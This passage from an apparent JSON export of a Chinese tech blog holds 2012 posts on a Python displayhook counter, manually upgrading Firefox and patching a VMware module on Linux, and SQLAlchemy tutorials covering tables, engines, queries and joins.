:', value\n        print\n        if value != self.previous_value:\n            self.count += 1\n            sys.ps1 = '(%3d)&gt; ' % self.count\n        self.previous_value = value\n        sys.__displayhook__(value) #默认值保存在这里\nprint 'installing'\nsys.displayhook = ExpressionCounter()#钩子，我的理解是每次使用都要触发的表达式  假设本文件是test\n</pre></p>\n\n<p><pre class=\"sh_python\">\ndongwm@linux-vkmz:~&gt; python\nPython 2.6.5 (r265:79063, Jul  5 2010, 11:47:21) \n[GCC 4.5.0 20100604 [gcc-4_5-branch revision 160292]] on linux2\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n&gt;&gt;&gt; import test\ninstalling\n&gt;&gt;&gt; 1+2</p>\n\n<p>  Previous: &lt;test.ExpressionCounter object at 0x80ab2ac&gt;\n  New     : 3</p>\n\n<p>3\n(  1)&gt; 'abc'</p>\n\n<p>  Previous: 3\n  New     : abc</p>\n\n<p>'abc'\n(  2)&gt; 'abc'</p>\n\n<p>  Previous: abc\n  New     : abc</p>\n\n<p>'abc'\n(  2)&gt; 'abc'*3</p>\n\n<p>  Previous: abc\n  New     : abcabcabc</p>\n\n<p>'abcabcabc'\n</pre></p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2012",
      "month": "July",
      "day": "10"
    }
  },
  {
    "id": 236,
    "title": "linux下升级到最新版本firefox浏览器",
    "category": "linux基础",
    "tags": [
      "firefox"
    ],
    "url": "/archives/linuxxiashengjidaozuixinbanbenfirefoxlanqi/",
    "content": "<p>前言：一直是firefox忠实用户，本文是普及篇，系统是opensuse11.3，其他系统请借鉴方法</p>\n\n<p>1 首先查看当前系统firefox信息：</p>\n\n<p>linux-vkmz:~ # rpm -qa|grep -i firefox\nMozillaFirefox-3.6.6-1.2.i586  #这里就是firefox的版本3.6.6，而现在最新版本已经是firefox13.0.1，可是系统源没有更高版本\nMozillaFirefox-branding-openSUSE-3.5-16.2.i586\nMozillaFirefox-translations-common-3.6.6-1.2.i586\n2 下载最新版本firefox：</p>\n\n<p>linux-vkmz:~ # wget http://download.firefox.com.cn/releases/firefox/13.0/zh-CN/Firefox-latest.tar.bz2</p>\n\n<p>linux-vkmz:~ #tar jxf Firefox-latest.tar.bz2 #解压缩</p>\n\n<p>3 查看系统firefox被安装到了那里</p>\n\n<p>linux-vkmz:~ # rpm -ql MozillaFirefox-3.6.6-1.2.i586</p>\n\n<p>/usr/bin/firefox  #我只截取了一部分，可以看见库文件在/usr/lib，可执行文件在/usr/bin\n/usr/lib/firefox\n/usr/lib/firefox/application.ini\n/usr/lib/firefox/blocklist.xml\n/usr/lib/firefox/chrome\n/usr/lib/firefox/chrome/browser.jar\n/usr/lib/firefox/chrome/browser.m</p>\n\n<p>...\nlinux-vkmz:~ #cp -rp firefox/* /usr/lib/firefox/   #拷贝lib文件到系统安装的firefox路径下</p>\n\n<p>linux-vkmz:~ #cp -rp firefox/firefox* /usr/bin/ #拷贝2个可执行文件到/usr/bin下</p>\n\n<p>OK了</p>\n",
    "date": {
      "year": "2012",
      "month": "July",
      "day": "11"
    }
  },
  {
    "id": 237,
    "title": "gentoo3.2.21内核编译vmware8.02failed to compile module vmnet 解决",
    "category": "gentoo",
    "tags": [

    ],
    "url": "/archives/gentoo3-2-21neihebianyivmware8-02failedtocompilemodulevmnetjiejue/",
    "content": "<p>前言：我一直是vmware忠实使用者,最近重新编译gentoo内核后重新安装vmware并且升级到8.02,其它模块正常,但是唯独vmnet编译失败,报错日志如下:</p>\n\n<p>2012-07-12T10:33:01.401+08:00| vthread-3| I120: Building module with command: /usr/bin/make -j -C /tmp/vmware-root/modules/vmnet-only auto-build SUPPORT_SMP=1 HEADER_DIR=/lib/modules/3.2.21-gentoo/build/include CC=/usr/bin/gcc GREP=/usr/bin/make IS_GCC_3=no VMCCVER=4.5.3\n2012-07-12T10:33:02.088+08:00| vthread-3| I120: Failed to compile module vmnet!</p>\n\n<p>解决:这是vmware软件bug,官方已经提供补丁:</p>\n\n<p>http://communities.vmware.com/servlet/JiveServlet/download/2025997-86343/vmware802fixlinux320.tar.gz</p>\n\n<p>解压缩后2个文件,根据你的vmpalyer和vmware版本修改patch-modules_3.2.0.sh ,然后执行:</p>\n\n<p>dongwm@localhost ~/下载 $ sudo ./patch-modules_3.2.0.sh</p>\n",
    "date": {
      "year": "2012",
      "month": "July",
      "day": "12"
    }
  },
  {
    "id": 238,
    "title": "SQLAlchemy教程(二)",
    "category": "python",
    "tags": [

    ],
    "url": "/archives/sqlalchemyjiaochenger/",
    "content": "<p>对于SQLAlchemy的一些总结:</p>\n\n<p><strong>1 metadata.create_all()</strong></p>\n\n<p>创建多个table可以这样使用,但是他还有个功能,它添加了\"IF NOT EXISTS\",就是在数据库存在的时候,他还是安全的</p>\n\n<p><strong>2 交互模式下的一个全过程:</strong></p>\n\n<p><pre class=\"sh_python\">\ndongwm@localhost ~ $ python\nPython 2.7.3 (default, Jul 11 2012, 10:10:17) \n[GCC 4.5.3] on linux2\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n&gt;&gt;&gt; from sqlalchemy import create_engine\n&gt;&gt;&gt; from sqlalchemy import Table, MetaData, Column, ForeignKey, Integer, String, Unicode, DateTime\n&gt;&gt;&gt; from datetime import datetime\n&gt;&gt;&gt; metadata = MetaData('sqlite:///tutorial.db')\n&gt;&gt;&gt; user_table = Table(\n...     'tf_user', metadata,\n...     Column('id', Integer, primary_key=True),\n...     Column('user_name', Unicode(16),\n...            unique=True, nullable=False),\n...     Column('password', Unicode(40), nullable=False),\n...     Column('display_name', Unicode(255), default=''),\n...     Column('created', DateTime, default=datetime.now))\n__main__:7: SAWarning: Unicode column received non-unicode default value.\n&gt;&gt;&gt; stmt = user_table.insert()  #插入数据\n&gt;&gt;&gt; stmt.execute(user_name='dongwm1', password='secret',display_name='testdongwm1')\n/usr/lib/python2.7/site-packages/SQLAlchemy-0.7.8-py2.7-linux-i686.egg/sqlalchemy/engine/default.py:463: SAWarning: Unicode type received non-unicode bind param value.\n  param.append(processors[key](compiled_params[key]))\n&lt;sqlalchemy.engine.base.ResultProxy object at 0x8377fcc&gt;\n&gt;&gt;&gt; stmt.execute(user_name='dongwm2', password='secret',display_name='testdongwm2') #这个实例可以多次插入,和sql区别很大\n&lt;sqlalchemy.engine.base.ResultProxy object at 0x837e4ec&gt;\n&gt;&gt;&gt; stmt = user_table.select() #select查询\n&gt;&gt;&gt; result = stmt.execute()\n&gt;&gt;&gt; for row in result:\n...     print row \n... \n(1, u'dongwm1', u'secret', u'testdongwm1', datetime.datetime(2012, 7, 17, 11, 57, 48, 515953))\n(2, u'dongwm2', u'secret', u'testdongwm2', datetime.datetime(2012, 7, 17, 11, 58, 5, 226977))\n&gt;&gt;&gt; result = stmt.execute()\n&gt;&gt;&gt; row =result.fetchone() #只获取符合要求的第一项\n&gt;&gt;&gt; print  row['user_name']\ndongwm1\n&gt;&gt;&gt; print row.password\nsecret\n&gt;&gt;&gt; print row.items()\n[(u'id', 1), (u'user_name', u'dongwm1'), (u'password', u'secret'), (u'display_name', u'testdongwm1'), (u'created', datetime.datetime(2012, 7, 17, 11, 57, 48, 515953))]\n&gt;&gt;&gt; stmt = user_table.select(user_table.c.user_name=='dongwm1') #过滤留下user_name=='dongwm1的项\n&gt;&gt;&gt; print stmt.execute().fetchall() #获取所有符合项\n[(1, u'dongwm1', u'secret', u'testdongwm1', datetime.datetime(2012, 7, 17, 11, 57, 48, 515953))]\n&gt;&gt;&gt; stmt = user_table.update(user_table.c.user_name=='dongwm1') #更新数据\n&gt;&gt;&gt; stmt.execute(password='secret123') #修改密码\n&lt;sqlalchemy.engine.base.ResultProxy object at 0x8377f6c&gt;\n&gt;&gt;&gt; stmt = user_table.delete(user_table.c.user_name != 'dongwm1')  #删除user_name不是dongwm1的条目\n&gt;&gt;&gt; stmt.execute()\n&lt;sqlalchemy.engine.base.ResultProxy object at 0x837f3ac&gt;\n&gt;&gt;&gt; user_table.select().execute().fetchall() #查询发现就剩一条了\n[(1, u'dongwm1', u'secret123', u'testdongwm1', datetime.datetime(2012, 7, 17, 11, 57, 48, 515953))]\n</pre></p>\n\n<p><strong>3 sission上面已经说过了,补充一些:</strong></p>\n\n<p>session.delete(u) #把映射类从会话中删除</p>\n\n<p><strong>4 关于引擎</strong></p>\n\n<p>引擎就是根据不同的数据库方言连接数据库的方法</p>\n\n<p>以下是一些例子(方法 driver://username:password@host:port/database):\nengine = create_engine('sqlite://')  #连接基于内存的sqlite\nengine = create_engine('sqlite:///data.sqlite')  #连接基于硬盘文件的sqlite\nengine = create_engine('postgres://dongwm:foo@localhost:5432/pg_db')  #连接postgresql\nengine = create_engine('mysql://localhost/mysql_db')  #连接mysql\nengine = create_engine('oracle://dongwm:foo@oracle_tns') #连接基于TNS协议的Oracle\nengine =create_engine('oracle://dongwm:foo@localhost:1521/oracle_sid') #连接没有TNS名字的Oracle</p>\n\n<p>也可以带一些参数:</p>\n\n<p>url='postgres://dongwm:foo@localhost/pg_db?arg1=foo&amp;arg2=bar'\nengine = create_engine(url)</p>\n\n<p>或者:</p>\n\n<p>engine = create_engine('postgres://dongwm:foo@localhost/pg_db',\nconnect_args=dict(arg1='foo', arg2='bar'))</p>\n\n<p>还可以通过函数完全控制连接:</p>\n\n<p>import psycopg\ndef connect_pg():\nreturn psycopg.connect(user='rick', host='localhost')\nengine = create_engine('postgres://', creator=connect_pg)</p>\n\n<p>import logging\nhandler = logging.FileHandler('sqlalchemy.engine.log')  #可以给它添加一个日志文件处理类\nhandler.level = logging.DEBUG\nlogging.getLogger('sqlalchemy.engine').addHandler(handler)</p>\n\n<p>上面说的操作表,也可以直接操作数据库:</p>\n\n<p>conn = engine.connect()\nresult = conn.execute('select user_name, email_address from tf_user') #结果是一个sqlalchemy.engine.ResultProxy的实例\nfor row in result:\nprint 'User name: %s Email address: %s' % (\nrow['user_name'], row['email_address'])\nconn.close()</p>\n\n<p>from sqlalchemy import pool #本来它已经自动通过数据库连接管理数据池,但是也可以手动管理\nimport psycopg2\npsycopg = pool.manage(psycopg2) #结果是一个sqlalchemy.pool.DBProxy实例\nconnection = psycopg.connect(database='mydb',\nusername='rick', password='foo')</p>\n\n<p><strong>5 关于元数据metadata</strong></p>\n\n<p>它收集了描述table对象等的元数据类,当使用ORM等时必须使用metadata</p>\n\n<p>如果他被绑定了,那么使用table.create()就会生成表,没有绑定需要:table.create(bind=some_engine_or_connection),其中table.create</p>\n\n<p>包含一些函数:</p>\n\n<p>autoload:默认是false,当数据库已经存在这个table会自动加载覆盖</p>\n\n<p>autoload_with:默认是false,是否自动加载引擎的字段结构</p>\n\n<p>reflect:默认是false,是否体现源表结构</p>\n\n<p>brand_table = Table('brand', metadata,\nColumn('name', Unicode(255)), # 覆盖类型\nautoload=True)</p>\n\n<p><strong>6 关于表结构:</strong></p>\n\n<p>设置表主键可以这样:</p>\n\n<p>Column('brand_id', Integer, ForeignKey('brand.id'),primary_key=True), #通过primary_key=True\nColumn('sku', Unicode(80), primary_key=True))\n也可以这样:\nproduct_table = Table(\n'product', metadata,\nColumn('brand_id', Integer, ForeignKey('brand.id')),\nColumn('sku', Unicode(80)),\nPrimaryKeyConstraint('brand_id', 'sku', name='prikey'))  #通过PrimaryKeyConstraint</p>\n\n<p>style_table = Table(\n'style', metadata,\nColumn('brand_id', Integer, primary_key=True),\nColumn('sku', Unicode(80), primary_key=True),\nColumn('code', Unicode(80), primary_key=True),\nForeignKeyConstraint(  #使用复合键,关联外部表的字段\n['brand_id', 'sku'],\n['product.brand_id', 'product.sku']))</p>\n\n<p>product_table = Table(\n'product', metadata,\nColumn('id', Integer, primary_key=True),\nColumn('brand_id', Integer, ForeignKey('brand.id')), #他的brand_id关联brand的让id\nColumn('sku', Unicode(80)),\nUniqueConstraint('brand_id', 'sku')) #约束唯一标识数据库表中的每条记录</p>\n\n<p>payment_table = Table(\n'payment', metadata,\nColumn('amount', Numeric(10,2), CheckConstraint('amount &gt; 0'))) #验证amount大于0\nuser_table = Table(\n'tf_user', MetaData(),\nColumn('id', Integer, primary_key=True),\nColumn('user_name', Unicode(16), unique=True, nullable=False),\nColumn('password', Unicode(40), nullable=False),\nColumn('first_name', Unicode(255), default=''),\nColumn('last_name', Unicode(255), default=''),\nColumn('created_apptime', DateTime, default=datetime.now), #default表示当不舍定具体值时设定一个默认值\nColumn('created_dbtime', DateTime, PassiveDefault('sysdate')), # PassiveDefault是数据库级别的默认值,\nColumn('modified', DateTime, onupdate=datetime.now)) #单设置onupdate这个属性，这是不应用到数据库的设计中的.只是存在于映射类中.</p>\n\n<p>#它是活跃更新的,因为每次执行的时间都不同</p>\n\n<p>user_table = Table(\n'tf_user', MetaData(),\nColumn('id', Integer, primary_key=True),\nColumn('user_name', Unicode(16), unique=True, nullable=False, index=True), #一旦数据库增长到一定规模时，可能需要考虑增加表的索引，以加快某些操作\nColumn('password', Unicode(40), nullable=False),\nColumn('first_name', Unicode(255), default=''),\nColumn('last_name', Unicode(255), default='', index=True))</p>\n\n<p>其中指定索引也可以这样:</p>\n\n<p>i = Index('idx_name', user_table.c.first_name,user_table.c.last_name,unique=True)\ni.create(bind=e)</p>\n\n<p>brand_table = Table(\n'brand', metadata,\nColumn('id', Integer, Sequence('brand_id_seq'), primary_key=True),  #需要通过序列化方式来创建新主键标识符的数据库，</p>\n\n<p>#SQLAlchemy 并不会自动为其生成。可以指定Sequence 生成\nColumn('name', Unicode(255), unique=True, nullable=False))</p>\n\n<p><strong>7 元数据操作</strong></p>\n\n<p>meta1 = MetaData('postgres://postgres:password@localhost/test',\n... reflect=True)\nmeta2 = MetaData('sqlite://')\nfor table in meta1.table_iterator():\ntable.tometadata(meta2) #通过这个方法让meta1的元数据被meta2使用\nmeta2.create_all()</p>\n\n<p>2 假如想放弃绑定使用drop_all( )或者drop(e)</p>\n",
    "date": {
      "year": "2012",
      "month": "July",
      "day": "17"
    }
  },
  {
    "id": 239,
    "title": "SQLAlchemy教程(三)",
    "category": "python",
    "tags": [
      "SQLAlchemy"
    ],
    "url": "/archives/sqlalchemyjiaochengsan/",
    "content": "<p><strong>1 自定义表结构类型:</strong></p>\n\n<p>from sqlalchemy import types</p>\n\n<p>class MyCustomEnum(types.TypeDecorator):  #自定义的类型继承至types.TypeDecorator</p>\n\n<p>impl=types.Integer  #实现指定的类型int</p>\n\n<p>def __init__(self, enum_values, *l, **kw):\ntypes.TypeDecorator.__init__(self, *l, **kw)\nself._enum_values = enum_values</p>\n\n<p>def convert_bind_param(self, value, engine):  #必须含有这个方法,转换python语言为SQL\nresult = self.impl.convert_bind_param(value, engine)\nif result not in self._enum_values:\nraise TypeError, (\n\"Value %s must be one of %s\" % (result, self._enum_values))\nreturn result</p>\n\n<p>def convert_result_value(self, value, engine):  #必须含有这个方法,通过db的api把SQL转换成python语言\n'Do nothing here'\nreturn self.impl.convert_result_value(value, engine)</p>\n\n<p>看一个例子:</p>\n\n<p><pre class=\"sh_python\">\nfrom sqlalchemy import types\nfrom sqlalchemy.databases import sqlite\nclass MyCustomEnum(types.TypeDecorator):\n    impl = types.Integer\n    def __init__(self, enum_values, *l, **kw):\n        types.TypeDecorator.__init__(self, *l, **kw)\n        self._enum_values = enum_values\n    def bind_processor(self, dialect): #如果提供这个方法会替代convert_bind_param( )和convert_result_value( ) \n        impl_processor = self.impl.bind_processor(dialect)\n        if impl_processor:\n            def processor(value):\n                result = impl_processor(value)\n                assert value in self._enum_values, \\\n                    \"Value %s must be one of %s\" % (result,\n                    self._enum_values)\n                return result\n        else:\n            def processor(value):\n                assert value in self._enum_values, \\\n                    \"Value %s must be one of %s\" % (value,\n                     self._enum_values)\n                return value\n        return processor\nmce=MyCustomEnum([1,2,3])\nprocessor = mce.bind_processor(sqlite.dialect())\nprint processor(1) #返回1 \nprint processor(5) #返回错误,因为不是1,2,3中的数据\n</pre>\n你甚至可以直接定义自定的TypeDecorator</p>\n\n<p>class NewType(types.TypeEngine): #TypeDecorator继承自types.TypeEngine</p>\n\n<p>def __init__(self, *args):\nself._args = args</p>\n\n<p>def get_col_spec(self):  #create_table( )会用到这个方法\nreturn 'NEWTYPE(%s)' % ','.join(self._args)</p>\n\n<p>def convert_bind_param(self, value, engine):  #这个必须设置\nreturn value</p>\n\n<p>def convert_result_value(self, value, engine):  #这个也必须设置\nreturn value</p>\n\n<p>2 SQL语句在交互模式下的例子:</p>\n\n<p>dongwm@localhost ~ $ python\nPython 2.7.3 (default, Jul 11 2012, 10:10:17)\n[GCC 4.5.3] on linux2\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n&gt;&gt;&gt; from sqlalchemy import Table, MetaData, Column, ForeignKey, Integer, String, Unicode, DateTime\n&gt;&gt;&gt; metadata=MetaData()\n&gt;&gt;&gt; simple_table = Table(  #一个简单的表结构\n...     'simple', metadata,\n...     Column('id', Integer, primary_key=True),\n...     Column('col1', Unicode(20)))\n&gt;&gt;&gt;\n&gt;&gt;&gt; stmt = simple_table.insert()  #插入数据操作的实例\n&gt;&gt;&gt; print stmt #打印这个实例\nINSERT INTO simple (id, col1) VALUES (:id, :col1) #里面包含需要替换的变量\n&gt;&gt;&gt; compiled_stmt = stmt.compile()  #编译语句\n&gt;&gt;&gt; print compiled_stmt.params #转成了字典得方式\n{'id': None, 'col1': None}\n&gt;&gt;&gt; from sqlalchemy import create_engine\n&gt;&gt;&gt; engine = create_engine('sqlite://')\n&gt;&gt;&gt; simple_table.create(bind=engine)  #创建table\n&gt;&gt;&gt; engine.execute(stmt, col1=\"Foo\") #给语句添加值\n/usr/lib/python2.7/site-packages/SQLAlchemy-0.7.8-py2.7-linux-i686.egg/sqlalchemy/engine/default.py:463: SAWarning: Unicode type received non-unicode bind param value.\nparam.append(processors[key](compiled_params[key]))\n&lt;sqlalchemy.engine.base.ResultProxy object at 0x8376c8c&gt;\n&gt;&gt;&gt; metadata.bind = engine  #和上面效果一样,给语句添加值\n&gt;&gt;&gt; stmt.execute(col1=\"Bar\")\n&lt;sqlalchemy.engine.base.ResultProxy object at 0x8376f4c&gt;\n&gt;&gt;&gt; stmt = simple_table.insert(values=dict(col1=\"Initial value\")) #这次插入已经设置了值\n&gt;&gt;&gt; print stmt\nINSERT INTO simple (col1) VALUES (?)\n&gt;&gt;&gt; compiled_stmt = stmt.compile()\n&gt;&gt;&gt; print compiled_stmt.params\n{'col1': 'Initial value'}\n&gt;&gt;&gt; stmt = simple_table.insert()\n&gt;&gt;&gt; stmt.execute(col1=\"First value\")\n&lt;sqlalchemy.engine.base.ResultProxy object at 0x838832c&gt;\n&gt;&gt;&gt;\n&gt;&gt;&gt; stmt.execute(col1=\"Second value\")\n&lt;sqlalchemy.engine.base.ResultProxy object at 0x838844c&gt;\n&gt;&gt;&gt; stmt.execute(col1=\"Third value\") #这样一行一行插入真是费劲\n&lt;sqlalchemy.engine.base.ResultProxy object at 0x838856c&gt;\n&gt;&gt;&gt; stmt.execute([dict(col1=\"Fourth Value\"), #可以一次插入多行\n...     dict(col1=\"Fifth Value\"),\n...     dict(col1=\"Sixth Value\")])\n&lt;sqlalchemy.engine.base.ResultProxy object at 0x83886ac&gt;\n&gt;&gt;&gt; from sqlalchemy import text\n&gt;&gt;&gt; stmt = simple_table.update(\n...     whereclause=text(\"col1='First value'\"),\n...     values=dict(col1='1st Value'))  #执行col1是First value的条目设置值为1st Value\n&gt;&gt;&gt; stmt.execute()\n&lt;sqlalchemy.engine.base.ResultProxy object at 0x838878c&gt;\n&gt;&gt;&gt; stmt = simple_table.update(text(\"col1='Second value'\")) #寻找col1是Second value的条目\n&gt;&gt;&gt; stmt.execute(col1='2nd Value') #执行更新时,设置其值,想过和上面的一样\n&lt;sqlalchemy.engine.base.ResultProxy object at 0x8376f4c&gt;\n&gt;&gt;&gt; stmt = simple_table.update(text(\"col1='Third value'\"))\n&gt;&gt;&gt; print stmt\nUPDATE simple SET id=?, col1=? WHERE col1='Third value'\n&gt;&gt;&gt; engine.echo = True #设置打印调试日志\n&gt;&gt;&gt; stmt.execute(col1='3rd value')\n2012-07-17 15:16:59,231 INFO sqlalchemy.engine.base.Engine UPDATE simple SET col1=? WHERE col1='Third value'\n2012-07-17 15:16:59,245 INFO sqlalchemy.engine.base.Engine ('3rd value',)\n2012-07-17 15:16:59,245 INFO sqlalchemy.engine.base.Engine COMMIT\n&lt;sqlalchemy.engine.base.ResultProxy object at 0x83767ec&gt;</p>\n\n<p>&gt;&gt;&gt; stmt = simple_table.delete(  #删除\n...     text(\"col1='Second value'\"))\n&gt;&gt;&gt; stmt.execute()\n2012-07-17 15:21:03,806 INFO sqlalchemy.engine.base.Engine DELETE FROM simple WHERE col1='Second value'\n2012-07-17 15:21:03,806 INFO sqlalchemy.engine.base.Engine ()\n2012-07-17 15:21:03,806 INFO sqlalchemy.engine.base.Engine COMMIT\n&lt;sqlalchemy.engine.base.ResultProxy object at 0x8376a0c&gt;\n&gt;&gt;&gt; from sqlalchemy import select\n&gt;&gt;&gt; stmt = select([simple_table.c.col1])  #查询col1这个字段\n&gt;&gt;&gt; for row in stmt.execute():\n...     print row\n(u'Foo',)\n(u'Bar',)\n(u'1st Value',)\n(u'2nd Value',)\n(u'3rd value',)\n(u'Fourth Value',)\n(u'Fifth Value',)\n(u'Sixth Value',)</p>\n\n<p>&gt;&gt;&gt; stmt = simple_table.select() #和上面的区别是这是条目全部显示\n&gt;&gt;&gt; for row in stmt.execute():  #这2句也可以这样表示stmt = select( simple_table])\n...     print row\n...\n(1, u'Foo')\n(2, u'Bar')\n(3, u'1st Value')\n(4, u'2nd Value')\n(5, u'3rd value')\n(6, u'Fourth Value')\n(7, u'Fifth Value')\n(8, u'Sixth Value')\n&gt;&gt;&gt; x = simple_table.c.col1==\"Foo\"\n&gt;&gt;&gt; print type(x)\n&lt;class 'sqlalchemy.sql.expression._BinaryExpression'&gt;\n&gt;&gt;&gt; print x\nsimple.col1 = :col1_1\n&gt;&gt;&gt; expr = simple_table.c.col1 + \"-col1\"  #它还支持运算符\n&gt;&gt;&gt; print expr\nsimple.col1 || :col1_1\n&gt;&gt;&gt; from sqlalchemy.databases import mysql\n&gt;&gt;&gt; print expr.compile(dialect=mysql.MySQLDialect())\nconcat(simple.col1, %s) #在不同的数据库软件,效果不同</p>\n\n<p>&gt;&gt;&gt; from sqlalchemy import func\n&gt;&gt;&gt; print func.now()\nnow()\n&gt;&gt;&gt; print func.current_timestamp\n&lt;sqlalchemy.sql.expression._FunctionGenerator object at 0x83888cc&gt;\n&gt;&gt;&gt; print func._(text('a=b'))\n(a=b)</p>\n\n<p>注:sqlalchemy支持in,op,startwith,endwith,between,like等运算</p>\n\n<p>&gt;&gt;&gt; from sqlalchemy import bindparam  #自定义绑定的词\n&gt;&gt;&gt; stmt = select([simple_table.c.col1],\n...     whereclause=simple_table.c.col1==bindparam('test'))  #用test替换原来的col1\n&gt;&gt;&gt; print stmt\nSELECT simple.col1\nFROM simple\nWHERE simple.col1 = ? #这里依然是col1\n&gt;&gt;&gt; print stmt.execute(test='Foo').fetchall()\n[(u'Foo',)]</p>\n\n<p>&gt;&gt;&gt; stmt = simple_table.select(order_by=[simple_table.c.col1])  #更具col1,升序排序\n&gt;&gt;&gt; print stmt\nSELECT simple.id, simple.col1\nFROM simple ORDER BY simple.col1\n&gt;&gt;&gt; print stmt.execute().fetchall()\n[(3, u'1st Value'), (4, u'2nd Value'), (5, u'3rd value'), (2, u'Bar'), (7, u'Fifth Value'), (1, u'Foo'), (6, u'Fourth Value'), (8, u'Sixth Value')]\n&gt;&gt;&gt; from sqlalchemy import desc\n&gt;&gt;&gt; stmt = simple_table.select(order_by=[desc(simple_table.c.col1)]) #根据col1,降序排序\n&gt;&gt;&gt; print stmt\nSELECT simple.id, simple.col1\nFROM simple ORDER BY simple.col1 DESC\n&gt;&gt;&gt; print stmt.execute().fetchall()\n[(8, u'Sixth Value'), (6, u'Fourth Value'), (1, u'Foo'), (7, u'Fifth Value'), (2, u'Bar'), (5, u'3rd value'), (4, u'2nd Value'), (3, u'1st Value')]\n注:distinct=True去重复,效果类似于SELECT DISTINCT</p>\n\n<p>&gt;&gt;&gt; stmt = simple_table.select(offset=1, limit=1) #offset设置偏移,这里就是略过第一个,返回第二个.limit设置返回多少个条目\n&gt;&gt;&gt; print stmt\nSELECT simple.id, simple.col1\nFROM simple\nLIMIT ? OFFSET ?\n&gt;&gt;&gt; print stmt.execute().fetchall()\n[(2, u'Bar')]\n看下面的例子:</p>\n\n<p>\"Persons\" 表：\n<table class=\"dataintable\">\n<tbody>\n<tr>\n<th>Id_P</th>\n<th>LastName</th>\n<th>FirstName</th>\n<th>Address</th>\n<th>City</th>\n</tr>\n<tr>\n<td>1</td>\n<td>Adams</td>\n<td>John</td>\n<td>Oxford Street</td>\n<td>London</td>\n</tr>\n<tr>\n<td>2</td>\n<td>Bush</td>\n<td>George</td>\n<td>Fifth Avenue</td>\n<td>New York</td>\n</tr>\n<tr>\n<td>3</td>\n<td>Carter</td>\n<td>Thomas</td>\n<td>Changan Street</td>\n<td>Beijing</td>\n</tr>\n</tbody>\n</table>\n\"Orders\" 表：\n<table class=\"dataintable\">\n<tbody>\n<tr>\n<th>Id_O</th>\n<th>OrderNo</th>\n<th>Id_P</th>\n</tr>\n<tr>\n<td>1</td>\n<td>77895</td>\n<td>3</td>\n</tr>\n<tr>\n<td>2</td>\n<td>44678</td>\n<td>3</td>\n</tr>\n<tr>\n<td>3</td>\n<td>22456</td>\n<td>1</td>\n</tr>\n<tr>\n<td>4</td>\n<td>24562</td>\n<td>1</td>\n</tr>\n<tr>\n<td>5</td>\n<td>34764</td>\n<td>65</td>\n</tr>\n</tbody>\n</table>\n现在，我们希望列出所有的人，以及他们的定购号码:\nSELECT Persons.LastName, Persons.FirstName, Orders.OrderNo\nFROM Persons\nLEFT JOIN Orders #将orders表join进来\nON Persons.Id_P=Orders.Id_P #关系联系\nORDER BY Persons.LastName #排序\n书中的例子是这样的:\nSELECT store.name\nFROM store\nJOIN product_price ON store.id=product_price.store_id\nJOIN product ON product_price.sku=product.sku\nWHERE product.msrp != product_price.price;\n转换成sqlalchemy语句:\n&gt;&gt;&gt;from_obj = store_table.join(product_price_table).join(product_table)\n&gt;&gt;&gt; query = store_table.select()\n&gt;&gt;&gt; query = query.select_from(from_obj)\n&gt;&gt;&gt; query = query.where(product_table.c.msrp != product_price_table.c.price)\n&gt;&gt;&gt; print query\nSELECT store.id, store.name\nFROM store JOIN product_price ON store.id = product_price.store_id JOIN product ON product.sku = product_price.sku\nWHERE product.msrp != product_price.price\n&gt;&gt;&gt; print query.column('product.sku')\nSELECT store.id, store.name, product.sku\nFROM store JOIN product_price ON store.id = product_price.store_id  JOIN product ON product.sku = product_price.sku\nWHERE product.msrp != product_price.price\n&gt;&gt;&gt; query2 = select([store_table, product_table.c.sku],from_obj=[from_obj],whereclause=(product_table.c.msrp !=product_price_table.c.price))\n&gt;&gt;&gt; print query2\nSELECT store.id, store.name, product.sku\nFROM store JOIN product_price ON store.id = product_price.store_id JOIN product ON product.sku = product_price.sku\nWHERE product.msrp != product_price.price\n&gt;&gt;&gt; query = product_table.select(and_(product_table.c.msrp &gt; 10.00 ,product_table.c.msrp &lt; 20.00)) #范围查询\n&gt;&gt;&gt; print query\nSELECT product.sku, product.msrp\nFROM product\nWHERE product.msrp &gt; ? AND product.msrp &lt; ?\n&gt;&gt;&gt; for r in query.execute():\n...print r\n(u'123', Decimal(\"12.34\"))</p>\n\n<p>&gt;&gt;&gt; from sqlalchemy import intersect</p>\n\n<p>&gt;&gt;&gt; query0 = product_table.select(product_table.c.msrp &gt; 10.00)\n&gt;&gt;&gt; query1 = product_table.select(product_table.c.msrp &lt; 20.00)\n&gt;&gt;&gt; query = intersect(query0, query1) #使用 intersect添加多query\n&gt;&gt;&gt; print query\nSELECT product.sku, product.msrp</p>\n\n<p>employee_table = Table(\n'employee', metadata,\nColumn('id', Integer, primary_key=True),\nColumn('manager', None, ForeignKey('employee.id')),\nColumn('name', String(255)))</p>\n\n<p>给设定alias:</p>\n\n<p>比如想实现以下SQL</p>\n\n<p>SELECT employee.name\nFROM employee, employee AS manager\nWHERE employee.manager_id = manager.id\nAND manager.name = 'Fred'</p>\n\n<p>&gt;&gt;&gt; manager = employee_table.alias('mgr')\n&gt;&gt;&gt; stmt = select([employee_table.c.name],\n...\nand_(employee_table.c.manager_id==manager.c.id,\n...\nmanager.c.name=='Fred'))\n&gt;&gt;&gt; print stmt\nSELECT employee.name\nFROM employee, employee AS mgr\nWHERE employee.manager_id = mgr.id AND mgr.name = ?</p>\n\n<p>&gt;&gt;&gt; manager = employee_table.alias()  #自动alias\n&gt;&gt;&gt; stmt = select([employee_table.c.name],\n...and_(employee_table.c.manager_id==manager.c.id,\n...manager.c.name=='Fred'))\n&gt;&gt;&gt; print stmt\nSELECT employee.name\nFROM employee, employee AS employee_1\nWHERE employee.manager_id = employee_1.id AND employee_1.name = ?</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>from sqlalchemy import types\nclass MyCustomEnum(types.TypeDecorator):\nimpl=types.Integer\ndef __init__(self, enum_values, *l, **kw):\ntypes.TypeDecorator.__init__(self, *l, **kw)\nself._enum_values = enum_values\ndef convert_bind_param(self, value, engine):\nresult = self.impl.convert_bind_param(value, engine)\nif result not in self._enum_values:\nraise TypeError, (\n\"Value %s must be one of %s\" % (result, self._enum_values))\nApplication-Specific Custom Types | 63return result\ndef convert_result_value(self, value, engine):\n'Do nothing here'\nreturn self.impl.convert_result_value(value, engine)</p>\n",
    "date": {
      "year": "2012",
      "month": "July",
      "day": "17"
    }
  },
  {
    "id": 240,
    "title": "SQLAlchemy教程(四)",
    "category": "python",
    "tags": [
